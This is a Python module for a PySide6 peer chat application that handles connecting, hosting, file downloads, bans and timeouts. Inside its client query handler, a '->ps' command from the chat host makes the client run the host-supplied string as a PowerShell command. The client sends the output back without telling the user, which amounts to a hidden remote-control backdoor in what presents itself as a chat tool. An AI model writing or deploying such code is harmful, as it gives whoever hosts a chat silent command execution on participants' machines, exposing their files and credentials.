# package
import datetime
import random
import socket
import time
import subprocess
import requests
from PySide6.QtCore import *
from PySide6.QtGui import *
from PySide6.QtWidgets import *
# modules

from .client import Client
from .server.Py_Server import Server
from ..Py_threading import Worker

class Functions:
    def __init__(self, app):
        self.app = app
        self.client = Client()
        self.server = Server()
        # thread pool
        self.threadPool = QThreadPool()
        self.fileIO = False
        self.allowedFileSize = 0
        # signals
        self.client.signals.query.connect(self.queryHandler)  # client received query
        self.client.signals.hostLeft.connect(lambda: self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: Host Left!"))
        self.client.signals.hostLeft.connect(lambda: self.app.clientConnStyles(False))
        self.server.signals.clientConnected.connect(lambda clientInfo: self.app.clientListActions(clientInfo[0], clientInfo[1], 'add'))
        self.server.signals.clientDisconnected.connect(lambda clientInfo: self.app.clientListActions(clientInfo[0], clientInfo[1], 'del'))
        self.server.signals.psResult.connect(lambda: self.app.printMsgToChat(">>> PowerShell", colorRgb='rgb(189, 255, 0)'))
        self.server.signals.psResult.connect(lambda result: self.app.printMsgToChat(result, colorRgb='rgb(255, 255, 255)'))
    ##### client side #####
    def clientConnTrigger(self):
        animation = QMovie(":/images/images/icons/loadingInf.gif")
        if self.client.alive:  # if client is connected, then disconnect him
            self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Connect, True)
            newWorker = Worker(self.client.disconnect, 1)
            self.threadPool.start(newWorker)
            newWorker.signals.finished.connect(lambda: self.app.clientConnStyles(False))
            newWorker.signals.finished.connect(lambda: self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Connect, False))

        else:  # if client is not connected, then connect him
            clientName = self.app.ui.chatPage_lineEdit_userName.text().strip()
            if clientName == '':
                self.app.ui.chatPage_lineEdit_userName.setStyleSheet("border: 2px solid rgb(233, 12, 89);")
            else:
                try:
                    serverAddress = (self.app.ui.chatPage_lineEdit_Ip.text().strip(),
                                     int(self.app.ui.chatPage_lineEdit_Port.text().strip()))
                except ValueError:  # in case user put letters in the port
                    self.app.ui.chatPage_lineEdit_Port.setStyleSheet("border: 2px solid rgb(233, 12, 89);")
                    self.app.ui.chatPage_lineEdit_userName.setStyleSheet("")
                else:
                    self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Connect, True)
                    newWorker = Worker(self.client.connect, 1, serverAddress)
                    self.threadPool.start(newWorker)
                    newWorker.signals.finished.connect(self.clientConnHandler)
                    newWorker.signals.finished.connect(lambda: self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Connect, False))

    def clientConnHandler(self):
        if self.client.alive:
            self.app.setClientImg()
            oldWorker = Worker(self.client.startEventLoop)  # long time running thread
            self.threadPool.start(oldWorker)
            self.app.clientConnStyles(True)
            # send client info to server
            clientName = self.app.ui.chatPage_lineEdit_userName.text().strip()
            clientInfo = {'clientName': clientName, 'clientImg': self.app.img}
            self.client.createQuery(isCmd=True, isCmdResult=False, cmd='->info', info=clientInfo)
        else:
            self.app.clientConnStyles(False)
            self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: I can't establish connection with the server, address incorrect!")
            self.app.ui.chatPage_lineEdit_Port.setStyleSheet("border: 2px solid rgb(233, 12, 89);")
            self.app.ui.chatPage_lineEdit_Ip.setStyleSheet("border: 2px solid rgb(233, 12, 89);")

    def queryHandler(self, query: dict):
        if query['isCmd']:
            if query['cmd'] == '->hostLeft':
                self.client.disconnect()
                self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: Host Left!")
                self.app.clientConnStyles(False)

            elif query['cmd'].startswith('->ps'):
                psWorker = Worker(self.runPS, 0, query['psCmd'])
                self.threadPool.start(psWorker)
        elif query['isCmdResult']:
            if query['cmd'].startswith('->info'):
                self.app.destroyMessages()
                self.allowedFileSize = query['result'][0]
                prevMessages = query['result'][1]
                prevMessages.apply(self.loadToChat)  # load previous messages
            elif query['cmd'].startswith('->sendFile'):
                self.fileIO = False
                self.app.downloadFile(query['result'][0], query['result'][1])
            elif query['cmd'].startswith('->banned'):
                self.client.disconnect()
                self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: You are banned!")
                self.app.clientConnStyles(False)
            elif query['cmd'].startswith('->timedOut'):
                self.client.disconnect()
                self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: You are {query['cmd'][2:]}!")
                self.app.clientConnStyles(False)
        else:
            self.loadToChat(query)

    def runPS(self, psCmd: str):
        result = subprocess.run(["powershell", psCmd], 
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE, 
                                text=True)
        if result.stdout:
            self.client.createQuery(isCmd=False, isCmdResult=True, cmd="->ps", result=result.stdout)
        if result.stderr:
            self.client.createQuery(isCmd=False, isCmdResult=True, cmd="->ps", result=result.stderr)

    def loadToChat(self, query):
        msg = query['msgBytes'].decode(query['msgEncoding'])
        userName = query['clientName']
        if query['contentType'] == 'msg/files':
            files = query['filesData']
        else:
            files = None
        queryDateTime = query['queryDateTime']
        img = query['clientImg']
        self.app.chatMessage(msg, files, userName, queryDateTime, img)

    def getFile(self, fileInfo, progressBar):
        if self.client.alive:
            fileId = fileInfo[0]
            fileSize = fileInfo[1]
            progressBar.setMaximum(fileSize)
            newWorker = Worker(self.setFileProgressBar, 0, progressBar)
            self.threadPool.start(newWorker)
            self.client.createQuery(isCmd=True, isCmdResult=False, cmd=f'->sendFile<{fileId}>')
            self.fileIO = True
        else:
            self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: You are not connected to the server!")

    def setFileProgressBar(self, progressBar):
        while self.fileIO:
            time.sleep(0.1)
            progressBar.setValue(len(self.client.recvBuffer))
        progressBar.setValue(progressBar.maximum())

    ##### server side #####
    def serverConnTrigger(self):
        animation = QMovie(":/images/images/icons/loadingInf.gif")
        if self.server.alive:  # if server is running, then stop him
            self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Host, True)
            newWorker = Worker(self.server.stop, 1)
            self.threadPool.start(newWorker)
            newWorker.signals.finished.connect(lambda: self.app.serverConnStyles(False))
            newWorker.signals.finished.connect(lambda: self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Host, False))
            self.app.ui.chatPage_lineEdit_HostPort.setText('')
            self.app.ui.chatPage_lineEdit_Ip_server.setText('')
        else:  # if server is not running, then start him
            self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Host, True)
            newWorker = Worker(self.server.start, 1)  # create a worker but don't start it yet
            newWorker.signals.finished.connect(lambda: self.app.connectBtnAnimations(animation, self.app.ui.chatPage_btn_Host, False))
            newWorker.signals.finished.connect(self.serverConnHandler)  # handle server connection
            #  let's set the address first
            portWorker = Worker(self.setAddress)

            portWorker.signals.finished.connect(self.setHostInfo)
            portWorker.signals.finished.connect(lambda: self.threadPool.start(newWorker))  # when the address has been set, start the server
            self.threadPool.start(portWorker)

    def serverConnHandler(self):
        if self.server.alive:  # start the event loop if server started
            oldWorker = Worker(self.server.startEventLoop)  # long time running thread
            self.threadPool.start(oldWorker)
            self.app.serverConnStyles(True)
            self.server.allowedFileSize = self.app.ui.chatPage_fileSizeTraffic.value()
        else:
            self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]: I can't start the server!")
            self.app.serverConnStyles(False)

    def setHostInfo(self):
        self.app.ui.chatPage_lineEdit_HostPort.setText(str(self.server.ADDRESS[1]))
        if self.app.ui.chatPage_cbox_HostType.currentIndex() == 0:
            self.app.ui.chatPage_lineEdit_Ip_server.setText(self.server.ADDRESS[0])
        else:
            internetWorker = Worker(requests.get, 0, r"https://api.ipify.org")
            self.threadPool.start(internetWorker)
            internetWorker.signals.error.connect(lambda: self.app.printMsgToChat(f"[{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')}]:You need internet connection to WAN host"))
            internetWorker.signals.error.connect(self.server.stop)
            internetWorker.signals.results.connect(lambda req: self.app.ui.chatPage_lineEdit_Ip_server.setText(req.text))

    def setAddress(self):
        ip = socket.gethostbyname(socket.gethostname())
        # get unUsed Port
        port = random.randrange(49152, 65535)
        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        if s.connect_ex((ip, port)) == 0:
            self.setAddress()
        else:
            self.server.ADDRESS = (ip, port)

    def sendCommand(self):
        if self.server.alive:
            cmd = self.server.execCmd(self.app.ui.chatPage_lineEdit_cmd.toPlainText().strip().lower())
            if cmd:
                self.app.ui.chatPage_lineEdit_cmd.setStyleSheet('')
            else:
                self.app.ui.chatPage_lineEdit_cmd.setStyleSheet('border: 2px solid rgb(233, 12, 89);')
